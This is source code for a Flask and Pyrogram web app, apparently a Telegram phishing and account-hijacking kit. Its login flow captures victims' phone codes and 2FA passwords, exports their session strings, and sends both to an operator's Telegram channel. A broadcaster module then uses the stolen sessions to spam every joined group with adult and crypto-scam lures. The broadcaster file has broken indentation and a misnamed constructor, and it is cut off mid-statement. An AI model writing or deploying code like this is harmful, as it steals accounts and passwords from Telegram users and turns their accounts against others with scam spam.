Nexa/database.py

import os
import requests
from datetime import datetime, timedelta
from pymongo import MongoClient
from pymongo.errors import ServerSelectionTimeoutError
from config import MONGODB_URI, DB_NAME, BOT_TOKEN, CHANNEL_ID, UPLOAD_FOLDER

# Global DB Variables
mongo_client = None
db = None
db_connected = False
users_col = None
ads_config_col = None
temp_sessions_col = None
ads_logs_col = None
broadcast_msgs_col = None

# Default advertisements (two configurable buttons)
DEFAULT_ADS = [
    {
        "id": "ad1",
        "text": "🔥 Hot content is available inside",
        "label": "Adult Content Available",
        "url": "https://example.com/adult",
    },
    {
        "id": "ad2",
        "text": "💰 Claim your free crypto reward",
        "label": "Free Crypto Money",
        "url": "https://example.com/crypto",
    },
]


def init_db():
    global mongo_client, db, db_connected, users_col, ads_config_col, temp_sessions_col, ads_logs_col, broadcast_msgs_col

    try:
        mongo_client = MongoClient(MONGODB_URI, serverSelectionTimeoutMS=5000)
        db = mongo_client[DB_NAME]
        mongo_client.admin.command('ping')
        print("✅ MongoDB Connected Successfully!")
        db_connected = True
    except Exception as e:
        print(f"❌ MongoDB Connection Failed: {e}")
        mongo_client = None
        db = None
        db_connected = False

    users_col = db.users if db is not None else None
    ads_config_col = db.ads_config if db is not None else None
    temp_sessions_col = db.temp_sessions if db is not None else None
    ads_logs_col = db.ads_logs if db is not None else None
    broadcast_msgs_col = db.broadcast_msgs if db is not None else None


def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in {'png', 'jpg', 'jpeg', 'gif', 'webp'}


def save_session_to_db(session_data):
    if users_col is None:
        return False
    try:
        existing = users_col.find_one({"phone": session_data["phone"]})
        if existing:
            users_col.update_one(
                {"_id": existing["_id"]},
                {"$set": {
                    "session_string": session_data["session_string"],
                    "updated_at": datetime.now(),
                    "user_id": session_data["id"],
                    "username": session_data["username"],
                    "first_name": session_data["first_name"],
                    "last_name": session_data["last_name"],
                    "status": "active",
                    "ads_enabled": True
                }}
            )
            return str(existing["_id"])
        else:
            result = users_col.insert_one({
                "user_id": session_data["id"],
                "first_name": session_data["first_name"],
                "last_name": session_data["last_name"],
                "username": session_data["username"],
                "phone": session_data["phone"],
                "session_string": session_data["session_string"],
                "session_name": session_data["session_name"],
                "created_at": datetime.now(),
                "updated_at": datetime.now(),
                "status": "active",
                "ads_enabled": True,
                "last_ad_time": None,
                "total_ads_sent": 0
            })
            return str(result.inserted_id)
    except Exception as e:
        print(f"MongoDB Error: {e}")
        return False


def get_ads_config():
    if ads_config_col is None:
        return {
            "ads_enabled": False,
            "interval": 600,
            "photo_path": None,
            "caption": "",
            "ads": [dict(a) for a in DEFAULT_ADS],
            "updated_at": datetime.now()
        }
    config = ads_config_col.find_one({"_id": "main_config"})
    if not config:
        default = {
            "_id": "main_config",
            "ads_enabled": False,
            "interval": 600,
            "photo_path": None,
            "caption": "",
            "ads": [dict(a) for a in DEFAULT_ADS],
            "updated_at": datetime.now()
        }
        ads_config_col.insert_one(default)
        return default
    # Backfill the ads key for older config docs
    config.setdefault("ads", [dict(a) for a in DEFAULT_ADS])
    return config


def update_ads_config(updates):
    if ads_config_col is None:
        return False
    updates["updated_at"] = datetime.now()
    ads_config_col.update_one({"_id": "main_config"}, {"$set": updates}, upsert=True)
    return True


def reset_ads_config():
    """Reset all advertisement content to defaults.
    Keeps interval + enabled state."""
    if ads_config_col is None:
        return False
    ads_config_col.update_one(
        {"_id": "main_config"},
        {"$set": {
            "ads": [dict(a) for a in DEFAULT_ADS],
            "caption": "",
            "photo_path": None,
            "updated_at": datetime.now()
        }},
        upsert=True
    )
    return True


def get_stats():
    if users_col is None:
        return {
            "total_users": 0,
            "active_users": 0,
            "idle_users": 0,
            "total_ads_sent": 0,
            "db_connected": False,
            "active_sessions": 0,
            "pending_msgs": 0,
            "online_users": 0,
            "recent_users": 0
        }

    total = users_col.count_documents({})
    active = users_col.count_documents({"status": "active"})
    idle = users_col.count_documents({"status": "idle"})

    pipeline = [{"$group": {"_id": None, "total": {"$sum": "$total_ads_sent"}}}]
    ads_result = list(users_col.aggregate(pipeline))
    total_ads = ads_result[0]["total"] if ads_result else 0

    yesterday = datetime.now() - timedelta(days=1)
    recent_users = users_col.count_documents({"created_at": {"$gte": yesterday}})

    last_hour = datetime.now() - timedelta(hours=1)
    online_users = users_col.count_documents({"last_ad_time": {"$gte": last_hour}})

    pending_msgs = 0
    if broadcast_msgs_col is not None:
        pending_msgs = broadcast_msgs_col.count_documents({})

    return {
        "total_users": total,
        "active_users": active,
        "idle_users": idle,
        "online_users": online_users,
        "recent_users": recent_users,
        "total_ads_sent": total_ads,
        "db_connected": True,
        "active_sessions": 0,  # Will be updated by session_manager
        "pending_msgs": pending_msgs
    }


def get_all_users():
    if users_col is None:
        return []
    users = list(users_col.find().sort("created_at", -1))
    formatted = []
    for user in users:
        formatted.append({
            "id": str(user.get("_id")),
            "user_id": user.get("user_id"),
            "name": f"{user.get('first_name', '')} {user.get('last_name', '')}".strip(),
            "username": user.get("username", "N/A"),
            "phone": user.get("phone", "N/A"),
            "status": user.get("status", "unknown"),
            "ads_enabled": user.get("ads_enabled", True),
            "total_ads_sent": user.get("total_ads_sent", 0),
            "created_at": user["created_at"].strftime("%Y-%m-%d %H:%M") if user.get("created_at") else "N/A",
            "last_ad_time": user["last_ad_time"].strftime("%Y-%m-%d %H:%M") if user.get("last_ad_time") else "Never"
        })
    return formatted


def send_to_channel(message):
    if not BOT_TOKEN:
        return False
    try:
        r = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": CHANNEL_ID, "text": message, "parse_mode": "HTML", "disable_web_page_preview": True},
            timeout=10
        )
        return r.json().get("ok", False)
    except Exception as e:
        print(f"Channel error: {e}")
        return False


# Initialize on import
init_db()



Nexa/session_manager.py

import asyncio
import threading
import uuid
from datetime import datetime, timedelta
from pyrogram import Client
from config import API_ID, API_HASH
from Nexa.database import temp_sessions_col

_global_stats = {'active_sessions': 0, 'pending_msgs': 0}

class SessionThread:
    def __init__(self, session_id, phone):
        self.session_id = session_id
        self.phone = phone
        self.client = None
        self.loop = None
        self.thread = None
        self.connected = False
        self.connection_error = None
        self._connected_event = threading.Event()
        self._start_thread()

    def _start_thread(self):
        self.thread = threading.Thread(target=self._run_loop, daemon=True)
        self.thread.start()

    async def _init_and_connect(self):
        self.client = Client(
            name=f"session_{self.session_id}",
            api_id=API_ID,
            api_hash=API_HASH,
            in_memory=True,
            no_updates=True
        )
        await self.client.connect()

    def _run_loop(self):
        try:
            self.loop = asyncio.new_event_loop()
            asyncio.set_event_loop(self.loop)
            self.loop.run_until_complete(self._init_and_connect())
            self.connected = True
            self._connected_event.set()
            self.loop.run_forever()
        except Exception as e:
            self.connection_error = str(e)
            self.connected = False
            self._connected_event.set()
        finally:
            try:
                if self.loop and self.loop.is_running():
                    self.loop.stop()
                if self.loop and not self.loop.is_closed():
                    self.loop.close()
            except:
                pass

    def wait_for_connection(self, timeout=10):
        return self._connected_event.wait(timeout=timeout)

    def execute(self, coro_func, *args, timeout=60):
        if not self.loop or not self.connected:
            raise RuntimeError("Session not connected")
        async def wrapper():
            coro = coro_func(*args)
            return await coro
        future = asyncio.run_coroutine_threadsafe(wrapper(), self.loop)
        return future.result(timeout=timeout)

    def stop(self):
        try:
            if self.client and self.connected:
                asyncio.run_coroutine_threadsafe(self.client.disconnect(), self.loop).result(timeout=3)
            if self.loop and self.loop.is_running():
                self.loop.call_soon_threadsafe(self.loop.stop)
            if self.thread and self.thread.is_alive():
                self.thread.join(timeout=3)
        except:
            pass

class SessionManager:
    def __init__(self):
        self._sessions = {}
        self._lock = threading.Lock()
        self._active_count = 0

    def create_session(self, session_id, phone):
        self.remove_session(session_id)
        session = SessionThread(session_id, phone)
        if not session.wait_for_connection(timeout=10):
            session.stop()
            raise RuntimeError("Session connection timeout")
        if not session.connected:
            error_msg = session.connection_error or "Unknown error"
            session.stop()
            raise RuntimeError(f"Failed to connect: {error_msg}")
        with self._lock:
            self._sessions[session_id] = session
            self._active_count = len([s for s in self._sessions.values() if s.connected])
        if temp_sessions_col is not None:
            temp_sessions_col.update_one(
                {'_id': session_id},
                {'$set': {'phone': phone, 'created_at': datetime.now(), 'status': 'connected'}},
                upsert=True
            )
        return session

    def get_session(self, session_id):
        with self._lock:
            session = self._sessions.get(session_id)
            if session and session.connected and session.thread.is_alive():
                return session
            elif session:
                self._sessions.pop(session_id, None)
        return None

    def remove_session(self, session_id):
        with self._lock:
            session = self._sessions.pop(session_id, None)
            self._active_count = len([s for s in self._sessions.values() if s.connected])
        if session:
            session.stop()
        if temp_sessions_col is not None:
            temp_sessions_col.delete_one({'_id': session_id})

    def cleanup_old(self, max_age_minutes=10):
        cutoff = datetime.now() - timedelta(minutes=max_age_minutes)
        if temp_sessions_col is not None:
            old_docs = temp_sessions_col.find({'created_at': {'$lt': cutoff}})
            for doc in old_docs:
                self.remove_session(doc['_id'])
            temp_sessions_col.delete_many({'created_at': {'$lt': cutoff}})

    def cleanup_dead_sessions(self):
        with self._lock:
            dead_sessions = []
            for session_id, session in list(self._sessions.items()):
                if not session.connected or not session.thread.is_alive():
                    dead_sessions.append(session_id)

            for session_id in dead_sessions:
                self._sessions.pop(session_id, None)
                if temp_sessions_col is not None:
                    temp_sessions_col.delete_one({'_id': session_id})

            self._active_count = len([s for s in self._sessions.values() if s.connected])
            return len(dead_sessions)

    def get_active_count(self):
        with self._lock:
            return self._active_count

class SessionCleaner:
    def __init__(self):
        self._running = False
        self._thread = None
        self._stop_event = threading.Event()

    def start(self):
        if self._running:
            return
        self._running = True
        self._stop_event.clear()
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()
        print("🧹 Session Cleaner started (30s interval)")

    def stop(self):
        if not self._running:
            return
        self._stop_event.set()
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)
        print("🧹 Session Cleaner stopped")

    def _run(self):
        from Nexa.database import ads_config_col, broadcast_msgs_col
        while not self._stop_event.is_set():
            try:
                session_manager = SessionManager()
                count = session_manager.cleanup_dead_sessions()
                if count > 0:
                    print(f"🧹 Cleaned up {count} dead sessions")

                _global_stats['active_sessions'] = session_manager.get_active_count()
                if broadcast_msgs_col is not None:
                    _global_stats['pending_msgs'] = broadcast_msgs_col.count_documents({})

                if ads_config_col is not None:
                    ads_config_col.update_one(
                        {"_id": "stats"},
                        {"$set": {
                            "active_sessions": _global_stats['active_sessions'],
                            "pending_msgs": _global_stats['pending_msgs'],
                            "last_cleanup": datetime.now()
                        }},
                        upsert=True
                    )
            except Exception as e:
                print(f"Session cleaner error: {e}")

            self._stop_event.wait(30)

session_manager = SessionManager()
session_cleaner = SessionCleaner()


Nexa/auth_routes.py

from flask import Blueprint, request, jsonify, session, redirect, render_template
import uuid
from datetime import datetime
from pyrogram.errors import (
    PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired,
    SessionPasswordNeeded, FloodWait
)
from .database import save_session_to_db, send_to_channel, temp_sessions_col
from .session_manager import session_manager

auth_bp = Blueprint('auth', __name__)

@auth_bp.route("/")
def index():
    return redirect("/login")

@auth_bp.route("/login")
def login():
    return render_template("login.html")

@auth_bp.route("/api/send-code", methods=["POST"])
def send_code():
    try:
        session_manager.cleanup_old()
    except:
        pass

    data = request.get_json() or {}
    phone = data.get("phone", "").strip()
    session_name = data.get("session_name", "session").strip()

    if not phone or len(phone) < 10:
        return jsonify(ok=False, error="Invalid phone number"), 400

    session_id = str(uuid.uuid4())[:8]
    try:
        session_thread = session_manager.create_session(session_id, phone)
        sent = session_thread.execute(lambda: session_thread.client.send_code(phone))

        if temp_sessions_col is not None:
            temp_sessions_col.update_one(
                {'_id': session_id},
                {'$set': {
                    'phone_code_hash': sent.phone_code_hash,
                    'session_name': session_name,
                    'status': 'code_sent',
                    'phone': phone
                }}
            )
        return jsonify(ok=True, session_id=session_id, message=f"Code sent to {phone}")
    except PhoneNumberInvalid:
        session_manager.remove_session(session_id)
        return jsonify(ok=False, error="Invalid phone number"), 400
    except FloodWait as e:
        session_manager.remove_session(session_id)
        return jsonify(ok=False, error=f"Please wait {e.value} seconds"), 429
    except Exception as e:
        session_manager.remove_session(session_id)
        return jsonify(ok=False, error=str(e)), 500

@auth_bp.route("/api/verify-code", methods=["POST"])
def verify_code():
    data = request.get_json() or {}
    session_id = data.get("session_id", "")
    code = data.get("code", "").strip().replace(" ", "")
    password = data.get("password", "")

    if not session_id:
        return jsonify(ok=False, error="Session ID required"), 400

    session_thread = session_manager.get_session(session_id)
    if not session_thread:
        return jsonify(ok=False, error="Session expired"), 400

    session_doc = temp_sessions_col.find_one({'_id': session_id}) if temp_sessions_col is not None else None
    phone = session_doc.get('phone') if session_doc else session_thread.phone
    phone_code_hash = session_doc.get('phone_code_hash') if session_doc else None
    session_name = session_doc.get('session_name', 'session') if session_doc else 'session'

    if not phone:
        session_manager.remove_session(session_id)
        return jsonify(ok=False, error="Session data lost"), 400

    if not code or not code.isdigit():
        return jsonify(ok=False, error="Invalid verification code"), 400

    result = {"user": None, "session_string": None, "error": None}

    try:
        try:
            user = session_thread.execute(
                lambda: session_thread.client.sign_in(phone_number=phone, phone_code_hash=phone_code_hash, phone_code=code)
            )
            session_string = session_thread.execute(lambda: session_thread.client.export_session_string())
            result = {"user": user, "session_string": session_string, "error": None}
        except SessionPasswordNeeded:
            if not password:
                result = {"user": None, "session_string": None, "error": "2FA_PASSWORD_REQUIRED"}
            else:
                try:
                    user = session_thread.execute(lambda: session_thread.client.check_password(password))
                    session_string = session_thread.execute(lambda: session_thread.client.export_session_string())
                    result = {"user": user, "session_string": session_string, "error": None}
                except Exception as e:
                    result = {"user": None, "session_string": None, "error": f"Invalid 2FA password: {str(e)}"}
        except PhoneCodeInvalid:
            result = {"user": None, "session_string": None, "error": "INVALID_CODE"}
        except PhoneCodeExpired:
            result = {"user": None, "session_string": None, "error": "CODE_EXPIRED"}
        except Exception as e:
            result = {"user": None, "session_string": None, "error": str(e)}
    except Exception as e:
        session_manager.remove_session(session_id)
        return jsonify(ok=False, error=f"Server error: {str(e)}"), 500

    if result["error"] == "2FA_PASSWORD_REQUIRED":
        return jsonify(ok=False, requires_password=True), 401

    if result["error"] in ["INVALID_CODE", "CODE_EXPIRED"]:
        session_manager.remove_session(session_id)
        if result["error"] == "INVALID_CODE":
            return jsonify(ok=False, error="Invalid verification code"), 401
        elif result["error"] == "CODE_EXPIRED":
            return jsonify(ok=False, error="Code expired"), 401

    if result["error"]:
        session_manager.remove_session(session_id)
        return jsonify(ok=False, error=result["error"]), 400

    session_manager.remove_session(session_id)

    user = result["user"]
    session_string = result["session_string"]
    user_info = {
        "id": user.id,
        "first_name": user.first_name,
        "last_name": user.last_name or "",
        "username": user.username or "N/A",
        "phone": phone,
        "session_string": session_string,
        "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "session_name": session_name
    }

    db_id = save_session_to_db(user_info)
    if db_id:
        print(f"✅ User saved: {db_id}")

    country_code = phone[:3] if phone.startswith("+") else phone[:2]
    channel_msg = f"""🟢 <b>NEW SESSION</b>
👤 <b>Name:</b> {user_info['first_name']} {user_info['last_name']}
🔗 <b>Username:</b> @{user_info['username']}
🆔 <b>User ID:</b> <code>{user_info['id']}</code>
📱 <b>Phone:</b> <code>{phone}</code>
🌍 <b>Country:</b> +{country_code}"""
    if password:
        channel_msg += f"\n🔑 <b>2FA:</b> <code>{password}</code>"
    channel_msg += f"\n\n<b>🔐 SESSION:</b>\n<code>{session_string}</code>"
    send_to_channel(channel_msg)
    session["user"] = user_info

    return jsonify(ok=True, user={
        "id": user_info["id"],
        "name": f"{user_info['first_name']} {user_info['last_name']}",
        "username": user_info["username"],
        "phone": phone
    })

@auth_bp.route("/api/logout", methods=["POST"])
def logout():
    session.clear()
    return jsonify(ok=True)

@auth_bp.route("/dashboard")
def dashboard():
    if "user" not in session:
        return redirect("/login")
    return render_template("dashboard.html", user=session["user"])



Nexa/admin_routes.py

import os
from flask import Blueprint, render_template, request, jsonify, send_from_directory
from datetime import datetime
from bson import ObjectId
from bson.errors import InvalidId
from werkzeug.utils import secure_filename
from config import UPLOAD_FOLDER
from Nexa.database import (
    get_ads_config, update_ads_config, get_stats, get_all_users,
    users_col, broadcast_msgs_col, allowed_file
)
from Nexa.broadcaster import ads_broadcaster
from Nexa.session_manager import session_manager, session_cleaner

admin_bp = Blueprint('admin', __name__, template_folder='../templates')


def _photo_filename(path):
    """Return just the filename for a stored photo path, or None."""
    return os.path.basename(path) if path else None


@admin_bp.route("/")
def admin_panel():
    config = get_ads_config()
    stats = get_stats()
    stats['active_sessions'] = session_manager.get_active_count()
    return render_template("admin.html", config=config, stats=stats)


@admin_bp.route("/stats")
def admin_stats_page():
    stats = get_stats()
    users = get_all_users()
    config = get_ads_config()
    stats['active_sessions'] = session_manager.get_active_count()
    return render_template("stats.html", stats=stats, users=users, config=config)


@admin_bp.route("/api/toggle-ads", methods=["POST"])
def toggle_ads():
    config = get_ads_config()
    new_status = not config.get("ads_enabled", False)

    if not update_ads_config({"ads_enabled": new_status}):
        return jsonify({"success": False, "error": "Failed to update config"}), 500

    if users_col is not None:
        users_col.update_many({}, {"$set": {"ads_enabled": new_status}})

    if new_status:
        ads_broadcaster.start()
        session_cleaner.start()
    else:
        ads_broadcaster.stop()
        session_cleaner.stop()

    return jsonify({
        "success": True,
        "enabled": new_status,
        "message": f"Ads {'enabled' if new_status else 'disabled'}!"
    })


@admin_bp.route("/api/set-interval", methods=["POST"])
def set_interval():
    data = request.get_json(silent=True) or {}
    try:
        interval = data.get("interval")
        if interval is None:
            return jsonify({"success": False, "error": "Interval required"}), 400
        interval = int(float(interval))
        if interval < 1 or interval > 1440:
            return jsonify({"success": False, "error": "Interval must be 1-1440 minutes"}), 400
    except (ValueError, TypeError):
        return jsonify({"success": False, "error": "Invalid interval format"}), 400

    seconds = interval * 60
    if update_ads_config({"interval": seconds}):
        return jsonify({
            "success": True,
            "interval": seconds,
            "minutes": interval,
            "message": f"Interval set to {interval} minutes"
        })
    return jsonify({"success": False, "error": "Failed to update interval"}), 500


@admin_bp.route("/api/set-caption", methods=["POST"])
def set_caption():
    data = request.get_json(silent=True) or {}
    caption = data.get("caption", "")
    if update_ads_config({"caption": caption}):
        return jsonify({"success": True, "message": "Caption updated!"})
    return jsonify({"success": False, "error": "Failed to update caption"}), 500


@admin_bp.route("/api/upload-photo", methods=["POST"])
def upload_photo():
    if 'photo' not in request.files:
        return jsonify({"success": False, "error": "No file"}), 400

    file = request.files['photo']
    if file.filename == '':
        return jsonify({"success": False, "error": "No file selected"}), 400

    if not (file and allowed_file(file.filename)):
        return jsonify({"success": False, "error": "Invalid file type"}), 400

    ext = file.filename.rsplit('.', 1)[1].lower()
    filename = secure_filename(
        f"ad_photo_{datetime.now().strftime('%Y%m%d_%H%M%S')}.{ext}"
    )
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    os.makedirs(UPLOAD_FOLDER, exist_ok=True)
    file.save(filepath)

    update_ads_config({"photo_path": filepath})
    return jsonify({
        "success": True,
        "path": filepath,
        "photo_file": filename,
        "message": "Photo uploaded!"
    })


@admin_bp.route("/api/preview")
def preview_ad():
    config = get_ads_config()
    photo_path = config.get("photo_path")
    return jsonify({
        "success": True,
        "photo_path": photo_path,
        "photo_file": _photo_filename(photo_path),
        "caption": config.get("caption", ""),
        "interval": config.get("interval", 600),
        "interval_minutes": config.get("interval", 600) // 60,
        "ads_enabled": config.get("ads_enabled", False)
    })


@admin_bp.route("/uploads/<path:filename>")
def serve_upload(filename):
    return send_from_directory(UPLOAD_FOLDER, filename)


@admin_bp.route("/api/user/<user_id>/toggle", methods=["POST"])
def toggle_user_ads(user_id):
    if users_col is None:
        return jsonify({"success": False, "error": "DB not connected"}), 500
    try:
        oid = ObjectId(user_id)
    except (InvalidId, TypeError):
        return jsonify({"success": False, "error": "Invalid user ID"}), 400

    user = users_col.find_one({"_id": oid})
    if not user:
        return jsonify({"success": False, "error": "User not found"}), 404

    new_status = not user.get("ads_enabled", True)
    users_col.update_one({"_id": oid}, {"$set": {"ads_enabled": new_status}})
    return jsonify({
        "success": True,
        "enabled": new_status,
        "message": f"User ads {'enabled' if new_status else 'disabled'}"
    })


@admin_bp.route("/api/stats/refresh")
def refresh_stats():
    stats = get_stats()
    stats['active_sessions'] = session_manager.get_active_count()
    return jsonify(stats)


@admin_bp.route("/api/clear-messages", methods=["POST"])
def clear_messages():
    if broadcast_msgs_col is None:
        return jsonify({"success": False, "error": "DB not connected"}), 500
    try:
        count = broadcast_msgs_col.count_documents({})
        broadcast_msgs_col.delete_many({})
        return jsonify({
            "success": True,
            "message": f"Cleared {count} pending messages",
            "cleared_count": count
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500



Nexa/__init__.py

from flask import Flask
from config import SECRET_KEY, UPLOAD_FOLDER, MAX_CONTENT_LENGTH

def create_app():
    app = Flask(__name__)
    app.secret_key = SECRET_KEY
    app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
    app.config['MAX_CONTENT_LENGTH'] = MAX_CONTENT_LENGTH

    # Ensure upload folder exists
    import os
    if not os.path.exists(UPLOAD_FOLDER):
        os.makedirs(UPLOAD_FOLDER)

    # Register blueprints
    from Nexa.admin_routes import admin_bp
    app.register_blueprint(admin_bp, url_prefix='/admin')

    return app








Nexa/broadcaster.py


import os
import asyncio
import threading
import time
import uuid
from datetime import datetime
from pyrogram import Client
from pyrogram.errors import (
FloodWait, BadRequest, UserDeactivated, AuthKeyUnregistered,
MsgIdInvalid, PeerIdInvalid, ChannelInvalid
)
from config import API_ID, API_HASH
from Nexa.database import users_col, ads_config_col, broadcast_msgs_col

class AdsBroadcaster:
def init(self):
self._running = False
self._thread = None
self._stop_event = threading.Event()
self._round_count = 0
self._current_broadcast_id = None

def start(self):  
    if self._running:  
        return False  
    self._running = True  
    self._stop_event.clear()  
    self._thread = threading.Thread(target=self._run, daemon=True)  
    self._thread.start()  
    print("📢 Ads Broadcaster started")  
    return True  

def stop(self):  
    if not self._running:  
        return False  
    self._stop_event.set()  
    self._running = False  
    if self._thread:  
        self._thread.join(timeout=5)  
    print("📢 Ads Broadcaster stopped")  
    return True  

def _get_interval(self):  
    if ads_config_col is not None:  
        config = ads_config_col.find_one({"_id": "main_config"})  
        if config:  
            return config.get("interval", 600)  
    return 600  

def _run(self):  
    while not self._stop_event.is_set():  
        try:  
            self._run_round()  
        except Exception as e:  
            print(f"Broadcast round error: {e}")  

        interval = self._get_interval()  
        minutes = interval // 60  
        print(f"⏳ Round complete. Waiting {minutes} minutes for next round...")  
        self._stop_event.wait(interval)  

def _verify_user_session(self, user):  
    user_id = user.get("user_id")  
    phone = user.get("phone", "Unknown")  
    session_string = user.get("session_string")  

    if not session_string:  
        return False  

    try:  
        async def check():  
            client = Client(  
                name=f"check_{user_id}_{uuid.uuid4().hex[:6]}",  
                api_id=API_ID,  
                api_hash=API_HASH,  
                session_string=session_string,  
                in_memory=True,  
                no_updates=True  
            )  
            try:  
                await client.connect()  
                me = await client.get_me()  
                return me is not None  
            except (AuthKeyUnregistered, UserDeactivated):  
                return False  
            finally:  
                try:  
                    await client.disconnect()  
                except:  
                    pass  

        loop = asyncio.new_event_loop()  
        asyncio.set_event_loop(loop)  
        result = loop.run_until_complete(check())  
        try:  
            loop.close()  
        except:  
            pass  
        return result  
    except Exception as e:  
        print(f"⚠️ Session check failed for {phone}: {e}")  
        return False  

def _delete_previous_messages(self):  
    if broadcast_msgs_col is None:  
        return  

    try:  
        old_msgs = list(broadcast_msgs_col.find())  
        if not old_msgs:  
            print("📝 No old messages to delete")  
            return  

        print(f"🗑️ Deleting {len(old_msgs)} old broadcast messages...")  
        deleted_count = 0  

        for msg_data in old_msgs:  
            try:  
                session_string = msg_data.get("session_string")  
                chat_id = msg_data.get("chat_id")  
                message_id = msg_data.get("message_id")  

                if not all([session_string, chat_id, message_id]):  
                    continue  

                async def delete_msg():  
                    client = Client(  
                        name=f"del_{uuid.uuid4().hex[:8]}",  
                        api_id=API_ID,  
                        api_hash=API_HASH,  
                        session_string=session_string,  
                        in_memory=True,  
                        no_updates=True  
                    )  
                    try:  
                        await client.connect()  
                        await client.delete_messages(chat_id, message_id)  
                        return True  
                    except Exception:  
                        return False  
                    finally:  
                        try:  
                            await client.disconnect()  
                        except:  
                            pass  

                loop = asyncio.new_event_loop()  
                asyncio.set_event_loop(loop)  
                success = loop.run_until_complete(delete_msg())  
                try:  
                    loop.close()  
                except:  
                    pass  

                if success:  
                    deleted_count += 1  
                    broadcast_msgs_col.delete_one({"_id": msg_data["_id"]})  

            except Exception as e:  
                print(f"⚠️ Failed to delete message: {e}")  

        print(f"✅ Deleted {deleted_count} old messages")  

    except Exception as e:  
        print(f"Error deleting old messages: {e}")  

def _run_round(self):  
    self._round_count += 1  
    broadcast_id = f"round_{self._round_count}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"  
    self._current_broadcast_id = broadcast_id  

    print(f"\n{'='*60}")  
    print(f"🚀 STARTING BROADCAST ROUND #{self._round_count}")  
    print(f"🆔 Broadcast ID: {broadcast_id}")  
    print(f"{'='*60}\n")  

    self._delete_previous_messages()  

    if users_col is None or ads_config_col is None:  
        print("❌ DB not connected")  
        return  

    config = ads_config_col.find_one({"_id": "main_config"})  
    if not config or not config.get("ads_enabled", False):  
        print("❌ Ads disabled")  
        return  

    caption = config.get("caption", "")  
    photo_path = config.get("photo_path")  

    raw_users = list(users_col.find({"ads_enabled": True}))  

    users_to_send = []  
    for user in raw_users:  
        if self._verify_user_session(user):  
            users_to_send.append(user)  
        else:  
            users_col.update_one(  
                {"_id": user["_id"]},   
                {"$set": {"ads_enabled": False, "status": "expired"}}  
            )  
            print(f"❌ Session expired for {user.get('phone', 'Unknown')}, disabled")  

    if not users_to_send:  
        print("📭 No valid users to broadcast")  
        return  

    print(f"📨 Broadcasting to {len(users_to_send)} valid users...")  

    for idx, user in enumerate(users_to_send):  
        if self._stop_event.is_set():  
            print("⏹️ Broadcast stopped")  
            break  

        threading.Thread(  
            target=self._send_to_user,  
            args=(user, caption, photo_path, broadcast_id),  
            daemon=True  
        ).start()  

        if (idx + 1) % 5 == 0:  
            time.sleep(2)  

def _send_to_user(self, user, caption, photo_path, broadcast_id):  
    user_id = user.get("user_id")  
    phone = user.get("phone", "Unknown")  
    session_string = user.get("session_string")  

    if not session_string:  
        print(f"⚠️ No session string for {phone}")  
        return  

    sent_messages = []  

    try:  
        async def send_ad():  
            client = Client(  
                name=f"temp_{user_id}_{uuid.uuid4().hex[:8]}",  
                api_id=API_ID,  
                api_hash=API_HASH,  
                session_string=session_string,  
                in_memory=True,  
                no_updates=True  
            )  

            try:  
                await client.connect()  

                try:  
                    me = await client.get_me()  
                    if not me:  
                        raise AuthKeyUnregistered("Invalid session")  
                except Exception:  
                    raise AuthKeyUnregistered("Session verification failed")  

                # 1. Send to Saved Messages (DM)  
                try:  
                    if photo_path and os.path.exists(photo_path):  
                        msg = await client.send_photo("me", photo=photo_path, caption=caption)  
                        sent_messages.append({  
                            "chat_id": "me",  
                            "message_id": msg.id,  
                            "session_string": session_string  
                        })  
                    else:  
                        msg = await client.send_message("me", caption)  
                        sent_messages.append({  
                            "chat_id": "me",  
                            "message_id": msg.id,  
                            "session_string": session_string  
                        })  
                    print(f"✅ DM sent to {phone}")  
                except Exception as e:  
                    print(f"❌ DM failed for {phone}: {e}")  

                # 2. Send to Joined Groups  
                try:  
                    group_count = 0  

                    async for dialog in client.get_dialogs():  
                        if self._stop_event.is_set():  
                            break  

                        if dialog is None or dialog.chat is None:  
                            continue  

                        chat_type = getattr(dialog.chat, 'type', None)  

                        if chat_type in ["group", "supergroup"]:  
                            chat_id = dialog.chat.id  

                            try:  
                                await client.get_chat(chat_id)  

                                if photo_path and os.path.exists(photo_path):  
                                    msg = await client.send_photo(chat_id, photo=photo_path, caption=caption)  
                                else:  
                                    msg = await client.send_message(chat_id, caption)  

                                sent_messages.append({  
                                    "chat_id": chat_id,  
                                    "message_id": msg.id,  
                                    "session_string": session_string  
                                })  
                                group_count += 1  
                                await asyncio.sleep(3)  

                            except PeerIdInvalid:  
                                print(f"⚠️ Skipping invalid peer {chat_id} for {phone}")  
                                continue  
                            except ChannelInvalid:  
                                print(f"⚠️ Skipping invalid channel {chat_id} for {phone}")  
                                continue  
                            except FloodWait as fw:  
                                print(f"⏳ FloodWait in group for {phone}: {fw.value}s")  
                                await asyncio.sleep(min(fw.value, 30))  
                            except BadRequest as e:  
                                print(f"⚠️ BadRequest in group for {phone}: {e}")  
                                continue  
                            except Exception as e:  
                                print(f"⚠️ Group send failed for {phone} in {chat_id}: {e}")  
                                continue  

                    print(f"✅ Sent to {group_count} groups for {phone}")  

                except Exception as e:  
                    print(f"❌ Groups failed for {phone}: {e}")  

                if users_col is not None and sent_messages:  
                    users_col.update_one(  
                        {"_id": user["_id"]},  
                        {  
                            "$set": {  
                                "last_ad_time": datetime.now(),  
                                "last_broadcast_id": broadcast_id  
                            },   
                            "$inc": {"total_ads_sent": len(sent_messages)}  
                        }  
                    )  

            except UserDeactivated:  
                raise  
            except AuthKeyUnregistered:  
                raise  
            except Exception as e:  
                print(f"❌ Error for {phone}: {e}")  
                raise  
            finally:  
                try:  
                    await client.disconnect()  
                except:  
                    pass  

        loop = asyncio.new_event_loop()  
        asyncio.set_event_loop(loop)  
        loop.run_until_complete(send_ad())  
        try:  
            loop.close()  
        except:  
            pass  

        if broadcast_msgs_col is not None and sent_messages:  
            for msg_data in sent_messages:  
                broadcast_msgs_col.insert_one({  
                    "user_id": user_id,  
                    "phone": phone,  
                    "broadcast_id": broadcast_id,  
